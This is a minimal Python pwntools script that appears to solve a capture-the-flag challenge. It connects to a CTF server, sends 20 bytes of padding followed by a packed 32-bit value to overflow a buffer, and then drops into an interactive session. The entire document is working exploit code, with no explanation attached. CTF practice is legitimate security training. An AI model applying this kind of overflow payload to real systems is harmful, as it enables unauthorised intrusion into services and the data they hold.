```python
from pwn import *

p = remote('ctf.tcp1p.com', 17027)

payload = b'a'*20 + p32(0x4e5750)

p.sendline(payload)

p.interactive()
```
